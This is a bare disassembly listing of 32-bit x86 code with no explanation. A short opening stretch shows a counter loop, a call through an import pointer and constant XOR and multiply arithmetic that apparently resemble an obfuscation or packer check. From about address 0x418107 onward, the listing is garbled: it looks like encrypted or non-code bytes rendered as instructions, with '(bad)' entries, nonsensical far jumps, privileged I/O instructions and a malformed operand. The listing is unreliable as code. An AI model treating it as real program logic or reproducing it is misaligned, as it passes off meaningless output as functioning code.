  41805c:	and    edx,DWORD PTR [edx+ecx*1]
  41805f:	mov    esi,DWORD PTR [ebp-0x8]
  418062:	add    DWORD PTR ds:0x429010,0x2693
  41806c:	mov    edx,0x7510893
  418071:	xor    eax,edx
  418073:	xor    esi,edx
  418075:	and    DWORD PTR ds:0x42901c,0x0
  41807f:	jmp    0x418091
  418084:	mov    ecx,DWORD PTR ds:0x42901c
  41808a:	inc    ecx
  41808b:	mov    DWORD PTR ds:0x42901c,ecx
  418091:	cmp    DWORD PTR ds:0x42901c,0x17
  418098:	jae    0x4180e3
  41809e:	cmp    DWORD PTR ds:0x42901c,0xb
  4180a5:	jne    0x4180c4
  4180ab:	push   DWORD PTR [ebp-0x10]
  4180ae:	push   0x8d74
  4180b3:	push   0x428004
  4180b8:	push   DWORD PTR [ebp-0x10]
  4180bb:	push   DWORD PTR [ebp-0x14]
  4180be:	call   DWORD PTR ds:0x421000
  4180c4:	cmp    DWORD PTR ds:0x42901c,0xa
  4180cb:	jne    0x4180de
  4180d1:	mov    ecx,DWORD PTR ds:0x42901c
  4180d7:	inc    ecx
  4180d8:	mov    DWORD PTR ds:0x42901c,ecx
  4180de:	jmp    0x418084
  4180e3:	mov    ecx,0x3272db
  4180e8:	add    esi,ecx
  4180ea:	add    eax,ecx
  4180ec:	imul   eax,esi
  4180ef:	mov    esi,DWORD PTR [ebp+0xc]
  4180f2:	cmp    esi,eax
  4180f4:	jne    0x41a4c2
  4180fa:	mov    eax,DWORD PTR [ebp-0x4]
  4180fd:	mov    esi,DWORD PTR [ebp-0x8]
  418100:	xor    eax,edx
  418102:	jmp    0x41a4b4
  418107:	mov    esp,0x2510558f
  41810c:	sub    DWORD PTR fs:[ebx-0x5f],0xffffff83
  418111:	mov    al,0xb8
  418113:	test   dl,bh
  418115:	and    edi,esi
  418117:	std    
  418118:	and    al,0x61
  41811a:	(bad)  
  41811b:	int    0x5f
  41811d:	bound  esp,QWORD PTR [edx-0x1d]
  418120:	ja     0x418112
  418122:	imul   esi,DWORD PTR [eax+0x48],0xffffffc7
  418126:	add    eax,DWORD PTR [eax]
  418128:	loope  0x4181a3
  41812a:	adc    eax,0xd2550dda
  41812f:	add    DWORD PTR [esi+0x3b69a326],ecx
  418135:	or     BYTE PTR [edx+edi*1-0xc],0x25
  41813a:	jmp    0xec08:0x64125333
  418141:	xchg   ebp,eax
  418142:	sti    
  418143:	cmp    BYTE PTR ds:0x756090fc,cl
  418149:	in     al,dx
  41814a:	adc    al,0xed
  41814c:	xor    eax,0x7bbc1994
  418151:	popa   
  418152:	add    BYTE PTR [ecx+0xa6dfee6],dl
  418158:	mov    eax,0x1688aad4
  41815d:	in     al,0xe9
  41815f:	pop    edx
  418160:	out    dx,eax
  418161:	fld    DWORD PTR [edx+ebp*2]
  418164:	iret   
  418165:	pop    es
  418166:	jbe    0x418108
  418168:	push   es
  418169:	jo     0x4181d7
  41816b:	bound  eax,QWORD PTR ds:0xc46aecd3
  418171:	scas   al,BYTE PTR es:[edi]
  418172:	pop    ds
  418173:	popf   
  418174:	iret   
  418175:	push   ds
  418176:	add    al,0x5
  418178:	jae    0x418104
  41817a:	(bad)  
  41817b:	mov    esp,0xd4100497
  418180:	push   cs
  418181:	inc    esi
  418182:	fbstp  TBYTE PTR [esi+esi*8-0x9]
  418186:	jmp    0x4181df
  418188:	dec    esi
  418189:	outs   dx,DWORD PTR ds:[esi]
  41818a:	test   DWORD PTR [edx],esp
  41818c:	or     esi,ecx
  41818e:	jmp    0xb15a:0x75541935
  418195:	xchg   edi,eax
  418196:	inc    ebx
  418197:	pop    esi
  418198:	mov    DWORD PTR [edx+0x17],0x4c46babe
  41819f:	pusha  
  4181a0:	push   es
  4181a1:	mov    al,0xce
  4181a3:	pop    ebp
  4181a4:	pop    edx
  4181a5:	mov    ecx,0x512b2159
  4181aa:	rol    DWORD PTR [esp+edi*1],1
  4181ad:	adc    DWORD PTR [ebp-0x33b9f788],edx
  4181b3:	and    DWORD PTR [edi+0x7981501],esi
  4181b9:	movsx  edx,WORD PTR [edx]
  4181bc:	popf   
  4181bd:	jmp    0x41823c
  4181bf:	daa    
  4181c0:	xchg   edx,eax
  4181c1:	aad    0x47
  4181c3:	or     BYTE PTR [eax+0x156f6cf5],dh
  4181c9:	push   es
  4181ca:	xor    bh,BYTE PTR [edx+0x4e]
  4181cd:	pop    es
  4181ce:	push   eax
  4181cf:	lea    edx,[ebx+eax*1+0x156eba14]
  4181d6:	jmp    0xf207:0xee7db95c
  4181dd:	xchg   edi,eax
  4181de:	or     ebx,edx
  4181e0:	sar    DWORD PTR [esi+0x19f7071d],0x69
  4181e7:	enter  0xe919,0x7a
  4181eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4181ec:	and    al,0xd7
  4181ee:	push   es
  4181ef:	clc    
  4181f0:	push   esp
  4181f1:	adc    al,0x4b
  4181f3:	jecxz  0x41823b
  4181f5:	push   esi
  4181f6:	cmc    
  4181f7:	rcl    BYTE PTR [ebx],0xa
  4181fa:	dec    eax
  4181fb:	into   
  4181fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181fd:	jns    0x418204
  4181ff:	push   0xa
  418201:	cmp    ebp,ebp
  418203:	mov    ds:0x6b70ef50,al
  418208:	push   ecx
  418209:	imul   bh
  41820b:	jl     0x4181cd
  41820d:	ins    BYTE PTR es:[edi],dx
  41820e:	add    DWORD PTR [eax+0x19ae5b2d],0xffffffd6
  418215:	push   ss
  418216:	cs scas eax,DWORD PTR es:[edi]
  418218:	loop   0x418284
  41821a:	mov    dl,bl
  41821c:	mov    ecx,0x67f716fc
  418221:	jge    0x418275
  418223:	or     eax,0x5c1a14b2
  418228:	add    al,0x5c
  41822a:	(bad)  
  41822b:	mov    esi,0x25a8eb99
  418230:	inc    esi
  418231:	jb     0x418263
  418233:	loopne 0x4182b3
  418235:	mov    esp,0x55d9e2a4
  41823a:	mov    ds:0x8d1f71c2,al
  41823f:	lahf   
  418240:	or     esp,DWORD PTR [eax+0x7a]
  418243:	shr    BYTE PTR [ecx],1
  418245:	or     bl,BYTE PTR [esi-0x3c]
  418248:	rcl    DWORD PTR ds:0x4241d753,0x72
  41824f:	xchg   esi,eax
  418250:	sbb    BYTE PTR [edi],0x2d
  418253:	or     cl,BYTE PTR [eax+0xa]
  418256:	retf   
  418257:	fisttp DWORD PTR [esi-0x5343ae3c]
  41825d:	fwait
  41825e:	int3   
  41825f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418260:	and    eax,0x154f4de0
  418265:	ins    DWORD PTR es:[edi],dx
  418266:	add    BYTE PTR [esi+0x4e],dl
  418269:	loop   0x418263
  41826b:	push   edi
  41826c:	mov    bl,0x7a
  41826e:	inc    edi
  41826f:	push   esp
  418270:	xor    eax,0x5c828bdd
  418275:	ror    esi,cl
  418277:	(bad)  
  418278:	adc    dl,BYTE PTR [ebp-0x6c]
  41827b:	xor    ebp,DWORD PTR [ebx+edi*8]
  41827e:	test   BYTE PTR [ebp-0x1adb8ba1],dl
  418284:	enter  0x8f78,0x62
  418288:	dec    esi
  418289:	xchg   esp,eax
  41828a:	mov    edx,0xe3311251
  41828f:	pop    esi
  418290:	std    
  418291:	dec    ebx
  418292:	jg     0x4182a0
  418294:	jg     0x4182c0
  418296:	xor    dl,BYTE PTR [eax+0xb]
  418299:	(bad)  
  41829a:	loopne 0x4182f4
  41829c:	adc    al,0xd0
  41829e:	fdivrp st(5),st
  4182a0:	shr    DWORD PTR [ebx+0x3c413886],1
  4182a6:	xchg   edi,eax
  4182a7:	leave  
  4182a8:	gs pop ecx
  4182aa:	sti    
  4182ab:	retf   
  4182ac:	mov    bl,0x98
  4182ae:	clc    
  4182af:	sub    eax,0x8affeb1
  4182b4:	xor    DWORD PTR [esi-0x63],ecx
  4182b7:	cs cwde 
  4182b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182ba:	mov    eax,0x48994da4
  4182bf:	pop    ds
  4182c0:	aam    0x49
  4182c2:	(bad)  
  4182c3:	mov    cl,0x8a
  4182c5:	push   cs
  4182c6:	fwait
  4182c7:	call   0x9b95:0x84a26a09
  4182ce:	sahf   
  4182cf:	xor    ch,BYTE PTR [edx-0x5d]
  4182d2:	add    al,bl
  4182d4:	(bad)  
  4182d5:	rol    BYTE PTR [edi+0x37],cl
  4182d8:	sub    edi,DWORD PTR ds:0x5f5a4d5c
  4182de:	fs xchg esp,eax
  4182e0:	jl     0x418359
  4182e2:	int    0x3b
  4182e4:	sbb    DWORD PTR [ecx-0x2],esp
  4182e7:	ret    
  4182e8:	xchg   ecx,eax
  4182e9:	jmp    FWORD PTR [ecx]
  4182eb:	dec    esi
  4182ec:	or     cl,BYTE PTR [ecx]
  4182ee:	mov    cl,0x3d
  4182f0:	ss pop ss
  4182f2:	mov    ch,BYTE PTR [esi-0x434c6192]
  4182f8:	dec    DWORD PTR [edi-0x6c]
  4182fb:	dec    eax
  4182fc:	xor    cl,cl
  4182fe:	and    BYTE PTR [ebx+eiz*2],bl
  418301:	dec    edx
  418302:	(bad)  
  418303:	leave  
  418304:	sbb    cl,BYTE PTR [esi+0x1d]
  418307:	in     al,0x7c
  418309:	push   cs
  41830a:	inc    ebp
  41830b:	inc    eax
  41830c:	pop    edx
  41830d:	je     0x418290
  41830f:	or     eax,0x62d4f82c
  418314:	fld    TBYTE PTR ds:0x920bdcfb
  41831a:	jp     0x418324
  41831c:	hlt    
  41831d:	mov    bh,0xfb
  41831f:	sub    DWORD PTR ds:0xf23c1b23,esi
  418325:	inc    edi
  418326:	sbb    eax,0x79868953
  41832b:	out    dx,eax
  41832c:	mov    ah,0x5f
  41832e:	dec    ebp
  41832f:	fwait
  418330:	dec    esi
  418331:	mov    esi,DWORD PTR [edx+0x17]
  418334:	jae    0x41836a
  418336:	pop    esi
  418337:	idiv   DWORD PTR [ecx-0x4c]
  41833a:	xlat   BYTE PTR ds:[ebx]
  41833b:	fisttp QWORD PTR [edx*4+0x58fcc5e7]
  418342:	mov    ds:0xd4096001,al
  418347:	cli    
  418348:	xchg   ebp,eax
  418349:	push   0x18
  41834b:	jb     0x4183ac
  41834d:	xor    BYTE PTR [esi+0x36ed656a],cl
  418353:	mov    cl,BYTE PTR [ebx+eax*8-0x78]
  418357:	mov    eax,0x5c7e7447
  41835c:	mov    al,ds:0xf45510b5
  418361:	(bad)  
  418362:	xchg   esp,eax
  418363:	mov    DWORD PTR [ebx+0x5f],edx
  418366:	mov    cl,ah
  418368:	and    ch,BYTE PTR [edi-0x3d]
  41836b:	nop    DWORD PTR [ebp-0x1c]
  41836f:	dec    eax
  418370:	ss jmp 0x4183e6
  418373:	lea    eax,[edx]
  418375:	rcr    DWORD PTR ds:0xa22aa3a3,cl
  41837b:	push   eax
  41837c:	addr16 je 0x4183ec
  41837f:	mov    edx,?
  418381:	mov    esi,0x8276bfeb
  418386:	fidiv  DWORD PTR [edi+ecx*4-0x4a7b694d]
  41838d:	inc    edx
  41838e:	xchg   edi,eax
  41838f:	lea    ecx,[edi+ebx*4+0x13]
  418393:	cmc    
  418394:	jo     0x418364
  418396:	jnp    0x418381
  418398:	jb     0x418376
  41839a:	arpl   WORD PTR [esi+edi*8+0x33480eae],dx
  4183a1:	call   0x611bfa1b
  4183a6:	pop    esp
  4183a7:	into   
  4183a8:	sub    eax,0x1d7587a1
  4183ad:	fdiv   DWORD PTR [ebx+0x31]
  4183b0:	retf   0xb5bc
  4183b3:	mov    cl,0x24
  4183b5:	sahf   
  4183b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183b7:	add    eax,DWORD PTR [ebx+edx*8+0x6a]
  4183bb:	push   esp
  4183bc:	dec    esi
  4183bd:	aaa    
  4183be:	inc    ebx
  4183bf:	mov    ds,WORD PTR [esp+edi*1]
  4183c2:	mov    esp,0xdf906b67
  4183c7:	cld    
  4183c8:	mov    DWORD PTR [ebx+0x1dcf747f],esp
  4183ce:	dec    edx
  4183cf:	mov    esi,0xb899a01a
  4183d4:	xchg   ecx,eax
  4183d5:	mov    esp,0xdf8da942
  4183da:	inc    esp
  4183db:	push   0x2a0a2e0e
  4183e0:	and    bh,BYTE PTR [esi-0x7049c22c]
  4183e6:	into   
  4183e7:	and    bl,BYTE PTR [ebp-0x45]
  4183ea:	mov    bh,0xcc
  4183ec:	jo     0x418438
  4183ee:	arpl   WORD PTR [eax+edi*1],si
  4183f1:	sbb    BYTE PTR [ebp-0x492adb40],dl
  4183f7:	pop    ecx
  4183f8:	sub    ecx,ebp
  4183fa:	imul   esp,ebx,0xffffffc0
  4183fd:	sbb    ebp,DWORD PTR [esi-0x4aad9264]
  418403:	cwde   
  418404:	inc    ebx
  418405:	pop    ebp
  418406:	add    BYTE PTR [ecx-0x3f],0x69
  41840a:	pop    ecx
  41840b:	gs push 0xead09b33
  418411:	out    0x50,al
  418413:	stc    
  418414:	and    BYTE PTR ds:0xfb43c430,ch
  41841a:	and    DWORD PTR [edx],ebx
  41841c:	fadd   st(6),st
  41841e:	jp     0x418431
  418420:	cmp    ebx,DWORD PTR ds:0xded24a57
  418426:	cmp    al,BYTE PTR [ebp+ebp*1-0x4f95fabc]
  41842d:	fisttp DWORD PTR [ebx-0x36b2dd11]
  418433:	mov    edx,0xc2e99f9a
  418438:	and    eax,0x3a7b129c
  41843d:	push   es
  41843e:	inc    edi
  41843f:	aas    
  418440:	dec    edi
  418441:	sub    BYTE PTR [ebx+0x591d94fc],0x91
  418448:	jns    0x4184a0
  41844a:	pop    esp
  41844b:	fst    DWORD PTR [esi]
  41844d:	jnp    0x41849e
  41844f:	and    eax,0x60b5a704
  418454:	test   DWORD PTR [ebp-0x72],ecx
  418457:	int3   
  418458:	push   es
  418459:	add    BYTE PTR [ebp-0x9371f3f],dl
  41845f:	sbb    DWORD PTR [edx-0x4e],0x22f62f33
  418466:	jo     0x41843b
  418468:	dec    eax
  418469:	sbb    DWORD PTR [eax+0x55],ebp
  41846c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41846d:	fld    TBYTE PTR [edi]
  41846f:	cdq    
  418470:	bound  edx,QWORD PTR [edx]
  418472:	into   
  418473:	or     eax,DWORD PTR [esi-0x16bfb054]
  418479:	mov    edi,ds
  41847b:	cwde   
  41847c:	mov    ds,WORD PTR [esi]
  41847e:	mov    dh,0x49
  418480:	and    BYTE PTR [ebp+0x64dccac9],bl
  418486:	iret   
  418487:	xchg   dh,bh
  418489:	and    eax,0xbb7d9356
  41848e:	ficom  DWORD PTR [edi-0x6c4fc487]
  418494:	jnp    0x4184a9
  418496:	scas   eax,DWORD PTR es:[edi]
  418497:	shl    DWORD PTR [edx+0x40],cl
  41849a:	jmp    0xfa43:0x9419e6c1
  4184a1:	int    0xf5
  4184a3:	aaa    
  4184a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184a5:	bound  ebx,QWORD PTR [esp+ebx*8-0x3618e1d]
  4184ac:	ss inc ebp
  4184ae:	loop   0x41845c
  4184b0:	adc    eax,0x11625487
  4184b5:	pop    ecx
  4184b6:	ja     0x4184c1
  4184b8:	shl    edx,cl
  4184ba:	xor    ah,BYTE PTR [edx+0x58]
  4184bd:	test   al,0xd4
  4184bf:	xchg   ecx,eax
  4184c0:	gs jmp 0x418494
  4184c3:	sbb    ebx,DWORD PTR [ecx+0x18]
  4184c6:	sub    ebx,ebx
  4184c8:	sti    
  4184c9:	add    eax,0x5545d8fd
  4184ce:	and    esi,esp
  4184d0:	dec    ecx
  4184d1:	pop    ecx
  4184d2:	mov    cl,0x67
  4184d4:	test   al,0xd6
  4184d6:	or     ah,ch
  4184d8:	mov    dl,0xe8
  4184da:	fsub   st(3),st
  4184dc:	lock inc ebx
  4184de:	xor    edi,DWORD PTR [edi+0x1882913d]
  4184e4:	(bad)  
  4184e5:	(bad)  
  4184e7:	jbe    0x4184a7
  4184e9:	ret    
  4184ea:	nop
  4184eb:	and    ebp,edx
  4184ed:	xor    bl,ch
  4184ef:	sti    
  4184f0:	push   esp
  4184f1:	test   eax,0xaa6d54b1
  4184f6:	xchg   ebx,eax
  4184f7:	dec    esp
  4184f8:	sbb    ebp,DWORD PTR [esi]
  4184fa:	lock or edi,ecx
  4184fd:	sub    al,0x99
  4184ff:	aas    
  418500:	clc    
  418501:	loope  0x418500
  418503:	cmp    edx,DWORD PTR [ecx+0x36]
  418506:	sahf   
  418507:	outs   dx,DWORD PTR ds:[esi]
  418508:	add    DWORD PTR [ecx-0x4eb92b11],esi
  41850e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41850f:	adc    eax,0xa8858919
  418514:	mov    eax,DWORD PTR [edi+0x68635e6a]
  41851a:	xchg   ebx,eax
  41851b:	dec    esp
  41851c:	or     al,0x1f
  41851e:	clc    
  41851f:	fwait
  418520:	or     bh,dl
  418522:	xchg   esp,eax
  418523:	jmp    0xcbd47454
  418528:	scas   al,BYTE PTR es:[edi]
  418529:	aam    0xaa
  41852b:	push   es
  41852c:	xlat   BYTE PTR ds:[ebx]
  41852d:	mov    bh,0x3f
  41852f:	sti    
  418530:	sub    eax,0x815ea4cc
  418535:	in     al,0x2f
  418537:	mov    edx,0x755879cb
  41853c:	xlat   BYTE PTR ds:[ebx]
  41853d:	mov    bh,0xe9
  41853f:	and    edx,DWORD PTR [ecx+0x1b16c81b]
  418545:	in     al,0xd
  418547:	dec    esi
  418548:	sub    esi,esp
  41854a:	add    al,0xe7
  41854c:	int    0xb9
  41854e:	fwait
  41854f:	jle    0x418581
  418551:	aad    0x37
  418553:	pop    ds
  418554:	and    edx,ebx
  418556:	das    
  418557:	out    0x7b,al
  418559:	loopne 0x418518
  41855b:	sbb    eax,0xe0564254
  418560:	repz add eax,0x96568433
  418566:	cmc    
  418567:	fsubr  QWORD PTR [ebx+0xc44a841]
  41856d:	or     al,0x1d
  41856f:	scas   eax,DWORD PTR es:[edi]
  418570:	sub    ah,BYTE PTR [edi]
  418572:	push   esp
  418573:	xor    BYTE PTR [edx+0x72cb6a],dh
  418579:	sub    eax,0x3a8dd92b
  41857e:	and    BYTE PTR [edi-0x69],ch
  418581:	call   0x691d:0x1d86e8ef
  418588:	scas   al,BYTE PTR es:[edi]
  418589:	mov    bh,0xc7
  41858b:	inc    edi
  41858c:	lods   eax,DWORD PTR ds:[esi]
  41858d:	jno    0x41860a
  41858f:	sbb    esp,DWORD PTR [ebp-0x70]
  418592:	mov    ebp,0x7b1e0ab0
  418597:	push   ss
  418598:	sub    eax,0xa52fb2dd
  41859d:	test   BYTE PTR [edi],al
  41859f:	sub    edx,DWORD PTR [ebp+0x3]
  4185a2:	test   edi,ebx
  4185a4:	mov    eax,0x7dd536c9
  4185a9:	xlat   BYTE PTR ds:[ebx]
  4185aa:	dec    ebp
  4185ab:	jecxz  0x41861a
  4185ad:	pop    edx
  4185ae:	inc    eax
  4185af:	push   es
  4185b0:	push   ebx
  4185b1:	and    eax,edi
  4185b3:	pusha  
  4185b4:	loop   0x418574
  4185b6:	mov    bh,0xa6
  4185b8:	loopne 0x418573
  4185ba:	test   al,ah
  4185bc:	add    ebp,DWORD PTR [edi+0x34ddbde0]
  4185c2:	and    DWORD PTR [edi],ebp
  4185c4:	int    0x84
  4185c6:	stos   BYTE PTR es:[edi],al
  4185c7:	xchg   ecx,eax
  4185c8:	sub    al,0x9b
  4185ca:	out    0x3d,al
  4185cc:	sar    DWORD PTR [esi-0x4a],cl
  4185cf:	fnstcw WORD PTR [esi]
  4185d1:	test   DWORD PTR [ebx],ecx
  4185d3:	pop    ecx
  4185d4:	test   eax,0xc14abd72
  4185d9:	and    esi,ebp
  4185db:	fbstp  TBYTE PTR [ebp-0x57]
  4185de:	xor    eax,0x22fcc635
  4185e3:	dec    edx
  4185e4:	loope  0x41864a
  4185e6:	imul   ebp,DWORD PTR [esi-0x61],0x2b
  4185ea:	inc    eax
  4185eb:	push   esp
  4185ec:	push   ebx
  4185ed:	jae    0x418659
  4185ef:	add    esp,DWORD PTR [edx+0xb]
  4185f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185f3:	dec    ebp
  4185f4:	fs dec edx
  4185f6:	neg    BYTE PTR [edi]
  4185f8:	push   0x46
  4185fa:	adc    al,0xea
  4185fc:	mov    esi,0x5e356bab
  418601:	mov    ebp,esi
  418603:	pop    esp
  418604:	fmul   st,st(2)
  418606:	ret    
  418607:	outs   dx,BYTE PTR ds:[esi]
  418608:	mov    ds:0xcdf1156d,al
  41860d:	ins    DWORD PTR es:[edi],dx
  41860e:	or     eax,0x81764a14
  418613:	push   ds
  418614:	call   0xd0ff:0x6ec5643d
  41861b:	cli    
  41861c:	mov    esi,0x75df7b0d
  418621:	sub    edi,DWORD PTR [eax+0x75]
  418624:	sub    esi,DWORD PTR [edx+0x10]
  418627:	fisttp DWORD PTR [esi+ebx*1+0x4257f232]
  41862e:	cwde   
  41862f:	(bad)
  418632:	adc    DWORD PTR [ebx-0x15],ecx
  418635:	loop   0x4185ea
  418637:	push   ecx
  418638:	add    BYTE PTR [eax],ch
  41863a:	pusha  
  41863b:	mov    cl,0x6a
  41863d:	fdivr  DWORD PTR [edi+0x4b51b7cb]
  418643:	jo     0x418658
  418645:	scas   eax,DWORD PTR es:[edi]
  418646:	aas    
  418647:	loope  0x418641
  418649:	fist   DWORD PTR [esi]
  41864b:	out    dx,eax
  41864c:	dec    eax
  41864d:	in     al,dx
  41864e:	mov    bl,0x45
  418650:	test   eax,ebp
  418652:	(bad)  
  418653:	fnstcw WORD PTR [ebx]
  418655:	dec    ebp
  418656:	mov    al,ds:0x4c406cf4
  41865b:	push   ds
  41865c:	dec    esi
  41865d:	stc    
  41865e:	push   edi
  41865f:	jbe    0x418673
  418661:	es mov ebx,edi
  418664:	cli    
  418665:	sbb    bl,BYTE PTR [edx]
  418667:	and    BYTE PTR [edx+0x2c6cba05],ah
  41866d:	daa    
  41866e:	pop    eax
  41866f:	ret    0xc6c2
  418672:	xchg   edx,eax
  418673:	jb     0x4186cd
  418675:	fbstp  TBYTE PTR [esi-0x25]
  418678:	call   0xa91f191b
  41867d:	pop    eax
  41867e:	fadd   QWORD PTR [ebx]
  418680:	and    BYTE PTR [edx+0x10],dh
  418683:	lock mov ecx,0x5471bb63
  418689:	je     0x4186ac
  41868b:	xchg   esp,eax
  41868c:	dec    eax
  41868d:	push   ebp
  41868e:	dec    eax
  41868f:	imul   ebx,DWORD PTR [edi-0x22eb5ba],0x4a
  418696:	jbe    0x4186d0
  418698:	pop    esp
  418699:	adc    eax,0x5580ed72
  41869e:	dec    esi
  41869f:	inc    ecx
  4186a0:	mov    dh,0x8a
  4186a2:	aam    0x72
  4186a4:	add    BYTE PTR [edi+0x61],ah
  4186a7:	xchg   esi,eax
  4186a8:	fwait
  4186a9:	lahf   
  4186aa:	inc    edx
  4186ab:	cld    
  4186ac:	add    BYTE PTR [esi],ah
  4186ae:	jecxz  0x418653
  4186b0:	test   DWORD PTR [edx-0x36],0x9b3accaa
  4186b7:	lods   al,BYTE PTR ds:[esi]
  4186b8:	add    al,0x41
  4186ba:	outs   dx,DWORD PTR ds:[esi]
  4186bb:	in     al,0x51
  4186bd:	mov    bh,ch
  4186bf:	loopne 0x4186c2
  4186c1:	sar    DWORD PTR [ecx-0x24],1
  4186c4:	mov    edi,0x2023675f
  4186c9:	(bad)  
  4186cb:	aam    0xb4
  4186cd:	jecxz  0x41868f
  4186cf:	jmp    0x4186b1
  4186d1:	xchg   esi,eax
  4186d2:	push   0x5d5dab94
  4186d7:	xlat   BYTE PTR ds:[ebx]
  4186d8:	mov    al,0xf5
  4186da:	dec    edx
  4186db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186dc:	cmp    esp,DWORD PTR [edx]
  4186de:	(bad)  
  4186df:	jns    0x418724
  4186e1:	adc    eax,esp
  4186e3:	push   ebx
  4186e4:	js     0x41868d
  4186e6:	adc    al,0x86
  4186e8:	stc    
  4186e9:	(bad)  
  4186ea:	adc    al,0x18
  4186ec:	in     eax,0xab
  4186ee:	dec    ecx
  4186ef:	leave  
  4186f0:	les    ebx,FWORD PTR [ebp+eiz*2+0x4e9a1626]
  4186f7:	jnp    0x418703
  4186f9:	outs   dx,DWORD PTR ds:[esi]
  4186fa:	xchg   edx,eax
  4186fb:	xor    BYTE PTR [edi+edi*2],dl
  4186fe:	push   cs
  4186ff:	xchg   BYTE PTR [ecx],al
  418701:	add    eax,0x30f7a49b
  418706:	xor    eax,0x9002a50d
  41870b:	jge    0x41869c
  41870d:	nop
  41870e:	cmp    eax,0xaeae8738
  418713:	mov    DWORD PTR [edi+0x2a1a73b8],0xa2b657fe
  41871d:	add    bl,0xd7
  418720:	mov    ecx,DWORD PTR [esi+eiz*1-0x52d49dd5]
  418727:	inc    edx
  418728:	jo     0x418722
  41872a:	xor    ebx,ebx
  41872c:	cmp    esp,edi
  41872e:	rcr    cl,0x21
  418731:	das    
  418732:	pop    ecx
  418733:	aas    
  418734:	push   0xffffffa9
  418736:	mov    dl,0xc8
  418738:	or     bh,BYTE PTR [edi-0x16b4bdd8]
  41873e:	adc    bh,al
  418740:	(bad)  
  418741:	gs test al,0xd
  418744:	ins    BYTE PTR es:[edi],dx
  418745:	mov    eax,0xb7266d8a
  41874a:	adc    ah,ah
  41874c:	test   DWORD PTR [ecx+0xcd5a129],eax
  418752:	into   
  418753:	mov    ds:0xfffae31d,eax
  418758:	mov    dl,0x64
  41875a:	mov    edx,0x44c4dcf6
  41875f:	ret    0xb8da
  418762:	clc    
  418763:	xor    BYTE PTR [esi],0x64
  418766:	fwait
  418767:	cmc    
  418768:	mov    edi,es
  41876a:	push   ds
  41876b:	lock mov eax,0x56e9841a
  418771:	div    DWORD PTR ds:0xa391caea
  418777:	pop    esp
  418778:	mov    edi,0x31689e4c
  41877d:	out    0xd,eax
  41877f:	lods   al,BYTE PTR ds:[esi]
  418780:	gs jl  0x418772
  418783:	sbb    eax,0x5d8be233
  418788:	add    ecx,DWORD PTR [ebx-0x4c153b0e]
  41878e:	or     al,0x6e
  418790:	push   eax
  418791:	xchg   ebp,eax
  418792:	or     bl,ch
  418794:	inc    esi
  418795:	sbb    eax,0xe3a8c53
  41879a:	pop    esi
  41879b:	xor    al,0x48
  41879d:	aad    0x3d
  41879f:	out    dx,al
  4187a0:	inc    esi
  4187a1:	xchg   edi,eax
  4187a2:	cdq    
  4187a3:	mov    bl,0x43
  4187a5:	pop    ss
  4187a6:	push   ebp
  4187a7:	dec    esi
  4187a8:	pusha  
  4187a9:	mov    DWORD PTR [ebx+0x3eb433e8],eax
  4187af:	inc    esp
  4187b0:	cdq    
  4187b1:	jge    0x41875f
  4187b3:	mov    cs,WORD PTR [ecx-0x50]
  4187b6:	pop    eax
  4187b7:	mov    esi,DWORD PTR [edi+0x29f0188a]
  4187bd:	lods   eax,DWORD PTR ds:[esi]
  4187be:	mov    ch,0x33
  4187c0:	(bad)  
  4187c1:	sub    eax,0x2b
  4187c4:	out    0x2d,eax
  4187c6:	add    ebp,esi
  4187c8:	push   ss
  4187c9:	dec    ebx
  4187ca:	or     ah,BYTE PTR [edx]
  4187cc:	push   ebx
  4187cd:	mov    DWORD PTR [ecx-0xd],eax
  4187d0:	in     eax,dx
  4187d1:	clc    
  4187d2:	dec    esp
  4187d3:	xor    esp,DWORD PTR [eax]
  4187d5:	pop    edi
  4187d6:	xor    ah,BYTE PTR [eiz*1+0x11418032]
  4187dd:	loop   0x4187b1
  4187df:	inc    DWORD PTR [edi]
  4187e1:	imul   edx,esp,0xffffff89
  4187e4:	ja     0x418816
  4187e6:	cmp    eax,0x717a6ab7
  4187eb:	cmp    ebp,esi
  4187ed:	or     bh,BYTE PTR [esi-0x5fc66e71]
  4187f3:	fcom   QWORD PTR [ebp-0x5e]
  4187f6:	icebp  
  4187f7:	fstp   DWORD PTR [edx-0x6c]
  4187fa:	adc    BYTE PTR [ebp-0x36af834],0xb5
  418801:	mov    al,ds:0x6728696
  418806:	sub    al,0xf6
  418808:	xchg   edx,eax
  418809:	fdiv   DWORD PTR [esi+0x3cb67e1f]
  41880f:	pop    edi
  418810:	call   0x8793:0x1e1c608e
  418817:	arpl   WORD PTR [ebx-0x17],si
  41881a:	jb     0x418856
  41881c:	push   es
  41881d:	fild   QWORD PTR ds:0x138e509e
  418823:	(bad)  
  418824:	(bad)  
  418826:	gs add eax,0xbeccb85b
  41882c:	sbb    BYTE PTR [edx+0x77d549a5],ah
  418832:	xchg   esp,eax
  418833:	or     al,0x98
  418835:	or     dh,ah
  418837:	cmp    BYTE PTR [edi-0x36],0x12
  41883b:	xchg   BYTE PTR [edi],al
  41883d:	adc    eax,0xefb4517d
  418843:	pop    ds
  418844:	addr16 inc esi
  418846:	fist   DWORD PTR [eax+0xda1ebd8]
  41884c:	jge    0x41889d
  41884e:	mov    ecx,0xa9d594ef
  418853:	mov    edi,0x2ceb8a4f
  418858:	or     edx,DWORD PTR [esi]
  41885a:	(bad)  
  41885b:	adc    al,0x3c
  41885d:	enter  0x5308,0x2f
  418861:	je     0x41889c
  418863:	adc    eax,0x2415c9df
  418868:	lds    esi,FWORD PTR [esi-0x17]
  41886b:	call   0x3b7c:0x23f97e20
  418872:	xchg   DWORD PTR [ecx+0xe],edx
  418875:	icebp  
  418876:	out    0x74,al
  418878:	jp     0x4188f2
  41887a:	xlat   BYTE PTR ds:[ebx]
  41887b:	push   ebp
  41887c:	imul   edx,DWORD PTR [ecx+0x52],0xffffffa3
  418880:	sbb    eax,0x6c8b5bfc
  418885:	pop    ebp
  418886:	add    ch,dh
  418888:	call   0x77dc:0x98b9b45f
  41888f:	xor    eax,0x794d10d8
  418894:	pop    ebx
  418895:	pop    ds
